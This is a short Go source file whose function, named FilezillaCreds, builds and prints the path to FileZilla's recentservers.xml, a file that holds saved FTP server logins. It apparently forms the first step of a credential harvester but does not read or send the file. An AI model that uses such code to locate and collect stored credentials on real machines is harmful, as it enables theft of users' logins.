package ftp

import (
	"fmt"
	"log"
	"os/user"
	"strings"
)

func FilezillaCreds() {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	uD := currentUser.Username
	username := strings.Split(uD, "\\")[1]
	path := "C:\\Users\\%s\\AppData\\Roaming\\FileZilla\\recentservers.xml"
	path = fmt.Sprintf(path, username)
	fmt.Println(path)
}
